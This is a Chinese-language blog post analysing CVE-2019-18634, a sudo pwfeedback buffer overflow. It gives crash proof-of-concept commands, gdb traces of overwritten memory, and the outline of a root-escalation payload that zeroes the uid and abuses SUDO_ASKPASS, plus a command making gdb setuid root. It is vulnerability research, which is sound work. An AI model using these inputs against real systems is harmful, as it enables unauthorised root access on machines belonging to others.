<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-18634 分析">
<meta property="og:url" content="https://bestwing.me/CVE-2019-18634-analysis.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png">
<meta property="og:image" content="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg">
<meta property="article:published_time" content="2020-02-06T16:00:00.000Z">
<meta property="article:modified_time" content="2020-06-22T18:00:43.000Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="CVE-2019-18634">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2019-18634 分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/Android-8.1-memcpy-func.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/Goodbye_2019,Hello_2020!.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2019-18634-analysis.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2019-18634-analysis.html&text=CVE-2019-18634 分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2019-18634-analysis.html&title=CVE-2019-18634 分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2019-18634-analysis.html&is_video=false&description=CVE-2019-18634 分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2019-18634 分析&body=Check out this article: https://bestwing.me/CVE-2019-18634-analysis.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2019-18634-analysis.html&title=CVE-2019-18634 分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2019-18634-analysis.html&title=CVE-2019-18634 分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2019-18634-analysis.html&title=CVE-2019-18634 分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2019-18634-analysis.html&title=CVE-2019-18634 分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2019-18634-analysis.html&name=CVE-2019-18634 分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2019-18634-analysis.html&t=CVE-2019-18634 分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC"><span class="toc-number">1.</span> <span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">寻找漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%88%E6%9E%9C%E5%B1%95%E7%A4%BA"><span class="toc-number">4.</span> <span class="toc-text">效果展示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2019-18634 分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-02-06T16:00:00.000Z" itemprop="datePublished">2020-02-07</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-2019-18634/" rel="tag">CVE-2019-18634</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>Sudo’s <em>pwfeedback</em> option can be used to provide visual feedback when the user is inputting their password. For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard <code>Password:</code> prompt disables the echoing of key presses. While <em>pwfeedback</em> is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.</p>
<p>Due to a bug, when the <em>pwfeedback</em> option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow. This bug can be triggered even by users not listed in the sudoers file. There is <strong>no</strong> impact unless <em>pwfeedback</em> has been enabled.</p>
</blockquote>
<p>可以知道的信息是：</p>
<ol>
<li>漏洞存在的情形时在开启 <strong>pwfeedback</strong> 的前提下</li>
</ol>
<p>开启方法 <code>echo Defaults pwfeedback &gt;&gt; /etc/sudoers</code><br>2. 影响版本  1.8.26-1.8.30<br>3. CVE 上写的 stack-based buffer overflow 是有误的，我们后面会提到</p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>在 openwall 和 sudo 官网上都能看到连接在下面</p>
<p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p>
<p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p>
<p><strong>PoC 1</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ socat pty,link&#x3D;&#x2F;tmp&#x2F;pty,waitslave exec:&quot;perl -e &#39;print((\&quot;A\&quot; x 100 . chr(0x15)) x 50)&#39;&quot; &amp;</span><br><span class="line"> $ sudo -S -k id &lt; &#x2F;tmp&#x2F;pty</span><br><span class="line"> Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p><strong>PoC2</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . chr(0)) x 50)&#39; | sudo -S -k id</span><br><span class="line">Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>PoC1 是通过 pty 程序传 payload  ，PoC2 是通过终端，另外可以看到 一个结尾为 <code>chr(0x15)</code> 一个结尾是 <code>chr(0)</code>, 这是根据不同的传入方式区分的。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p>我的环境是 ubuntu18.04 然后我编译了一份 sudo 1.8.21p2 的源码，方便用来调试</p>
<p>为了方便，我一开始用的是 PoC2：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/sudo-1.8.21p2/src/.libs$ gdb -q ./sudo</span><br><span class="line">Reading symbols from ./sudo...done.</span><br><span class="line">gdb-peda$ r -S id &lt; /tmp/poc2</span><br><span class="line">Starting program: /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo -S id &lt; /tmp/poc2</span><br><span class="line">sudo: effective uid is not 0, is /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo on a file system with the <span class="string">&#x27;nosuid&#x27;</span> option <span class="built_in">set</span> or an NFS file system without root privileges?</span><br><span class="line">[Inferior 1 (process 14799) exited with code 01]</span><br></pre></td></tr></table></figure>

<p>第一次挂载 gdb 的时候会发现 权限不够，但是如果权限是 root sudo又失去了意义，所以我给 gdb 挂上了和 sudo 一样的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root:root /usr/bin/gdb &amp;&amp; chmod 4755 /usr/bin/gdb</span><br></pre></td></tr></table></figure>

<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png"></a></p>
<p>然后在调试，就基本确定了主要漏洞的存在，在 tgetpass.c:178 getln函数里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (timeout &gt; <span class="number">0</span>)</span><br><span class="line">alarm(timeout);</span><br><span class="line">   pass = getln(input, buf, <span class="keyword">sizeof</span>(buf), ISSET(flags, TGP_MASK));</span><br><span class="line">   alarm(<span class="number">0</span>);</span><br><span class="line">   save_errno = errno;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (neednl || pass == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(output, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">goto</span> restore;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>而且, 由于 buf 是static const 位于bss上，所以并不是 什么栈溢出，而是 bss 溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">tgetpass(<span class="keyword">const</span> <span class="keyword">char</span> *prompt, <span class="keyword">int</span> timeout, <span class="keyword">int</span> flags,</span><br><span class="line">    struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savealrm</span>, <span class="title">saveint</span>, <span class="title">savehup</span>, <span class="title">savequit</span>, <span class="title">saveterm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">savetstp</span>, <span class="title">savettin</span>, <span class="title">savettou</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *askpass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i, input, output, save_errno, neednl = <span class="number">0</span>, need_restart;</span><br><span class="line">    debug_decl(tgetpass, SUDO_DEBUG_CONV)</span><br></pre></td></tr></table></figure>



<p>这个时候，如果我们用 ida 看，能看到他总共覆盖了哪些变量</p>
<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" style="zoom:50%;" /></a>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们找到了一些能覆盖的内容，那么我紧接着要找到哪些是可利用的, 中间 user_details 这个结构体的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p user_details</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  pid &#x3D; 0x41414141,</span><br><span class="line">  ppid &#x3D; 0x41414141,</span><br><span class="line">  pgid &#x3D; 0x41414141,</span><br><span class="line">  tcpgid &#x3D; 0x41414141,</span><br><span class="line">  sid &#x3D; 0x41414141,</span><br><span class="line">  uid &#x3D; 0x41414141,</span><br><span class="line">  euid &#x3D; 0x41414141,</span><br><span class="line">  gid &#x3D; 0x41414141,</span><br><span class="line">  egid &#x3D; 0x41414141,</span><br><span class="line">  username &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  cwd &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  tty &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  host &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  shell &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  groups &#x3D; 0x4141414141414141,</span><br><span class="line">  ngroups &#x3D; 0x41414141,</span><br><span class="line">  ts_cols &#x3D; 0x41414141,</span><br><span class="line">  ts_lines &#x3D; 0x41414141</span><br><span class="line">&#125;</span><br><span class="line">gdb</span><br></pre></td></tr></table></figure>

<p>这个时候，我们就会想如果我们把 uid 覆盖成0 会怎么样？另外在看代码的过程中一段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">// tgetpass.c 276</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fork a child and exec sudo-askpass to get the password from the user.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">sudo_askpass(<span class="keyword">const</span> <span class="keyword">char</span> *askpass, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>], *pass;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savechld</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>], status;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    debug_decl(sudo_askpass, SUDO_DEBUG_CONV)</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">	closefrom(STDERR_FILENO + <span class="number">1</span>);</span><br><span class="line">	execl(askpass, askpass, prompt, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">	sudo_warn(U_(<span class="string">&quot;unable to run %s&quot;</span>), askpass);</span><br><span class="line">	_exit(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里 execl 的参数 askpass 是前面被覆盖的变量之一，感觉后面会用到。然后在调试的过程中，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 211</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NSIG; i++) &#123;</span><br><span class="line">	<span class="keyword">if</span> (signo[i]) &#123;</span><br><span class="line">	    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">		<span class="keyword">case</span> SIGTSTP: <span class="comment">// 18</span></span><br><span class="line">		<span class="keyword">case</span> SIGTTIN: <span class="comment">// 21</span></span><br><span class="line">		<span class="keyword">case</span> SIGTTOU: <span class="comment">// 22</span></span><br><span class="line">		    <span class="keyword">if</span> (suspend(i, callback) == <span class="number">0</span>)</span><br><span class="line">			need_restart = <span class="number">1</span>;</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		    kill(getpid(), i);</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>卡在了 这里，signo 也是我们覆盖的变量之一，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30x &amp;signo</span><br><span class="line">0x5583b72413e0 &lt;signo&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b72413f0 &lt;signo+16&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241400 &lt;signo+32&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241410 &lt;signo+48&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241420 &lt;signo+64&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241430 &lt;signo+80&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241440 &lt;signo+96&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241450 &lt;signo+112&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241460 &lt;signo+128&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241470 &lt;signo+144&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241480 &lt;signo+160&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b7241490 &lt;signo+176&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b72414a0 &lt;signo+192&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b72414b0 &lt;signo+208&gt;:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5583b72414c0 &lt;signo+224&gt;:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure>

<p>此时， signo 被覆盖成了 0x41414141 * N ，从代码逻辑看，我们得为空才能避免被 kill 掉，但由于我们的 此时的 PoC2 是以 <code>chr(0)</code> 作结尾的，所以 signo 此时必不能为 <code>\x00</code>, 那么此时我们只能换成 PoC1 去调试。紧接着另外一个问题又来了，由于 PoC1 是 pty 形式的，所以我们得做以下顺序</p>
<ol>
<li>运行 gdb</li>
<li>挂载调试器</li>
<li>然后才是 socat 命令</li>
</ol>
<p>不然 可能你刚挂载上去 程序就 crash 掉了</p>
<p>我这里用了一个更蠢的方法，就是 通过 gdb 强行 set 关键的数据，这样虽然慢了一点，但避免了我接着去解决 gdb 调试sudo 的问题</p>
<p>所以到此时，思路就是除了 user_details 的内容，其他我们先默认覆盖为 0 ，则 payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x00\x15&quot; * buf_size + &quot;\x00\x15&quot; * signo_sz + &quot;\x00&quot; * tgetpass_flags + &quot;\x00&quot; *24+ user_details + ...</span><br></pre></td></tr></table></figure>

<p>但是，这里又会出现一个问题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/exploit$ ./exploit.sh</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing:</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">sudo: 1 incorrect password attempt</span><br><span class="line">Exploiting!</span><br></pre></td></tr></table></figure>

<p>然后翻代码的时候，猜测是 <strong>tgetpass_flag</strong> 有问题，不能是 “\x00\x00\x00\x00” ,因为我们最后可能要用到 sudo_askpassh 这个函数，</p>
<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" style="zoom:50%;" /></a>

<p>在代码里和 sudo_askpassh 有关的字样好像是 TGP_ASKPAS ,看到有关宏定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for tgetpass()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO	0x00		<span class="comment">/* turn echo off reading pw (default) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ECHO	0x01		<span class="comment">/* leave echo on when reading passwd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_STDIN	0x02		<span class="comment">/* read from stdin, not /dev/tty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ASKPASS	0x04		<span class="comment">/* read from askpass helper program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_MASK	0x08		<span class="comment">/* mask user input when reading */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO_TRY	0x10		<span class="comment">/* turn off echo if possible */</span></span></span><br></pre></td></tr></table></figure>

<p>那大概就是 0x4了 所以这里设置为 “\x04\x00\x00\x00”，那剩下的 <strong>user_details</strong> 结构体怎么办？ 最简单的办法就抄一个，然后将 uid 字段设置为 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_details &#x3D; &quot;\x53\x87\x00\x00\x47\x87\x00\x00\x53\x87\x00\x00\x53\x87\x00\x00\x76\x3d\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure>

<p>上面是我从 gdb 直接手抄的，并将 uid 设置为0</p>
<p>最后 加上足够长的 结束符 和 “\n” 就完成了整个 exploit ，另外 由于我们要提权，所以得事前写好一个 shell , set uid 并执行一个shell。</p>
<p>且在执行 exploit的时候要设置 SUDO_ASKPASS 环境变量为执行程序路径</p>
<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE"><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" title="asciicast" class="gallery-item"><img src="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" alt="asciicast"></a></a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p>
<p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
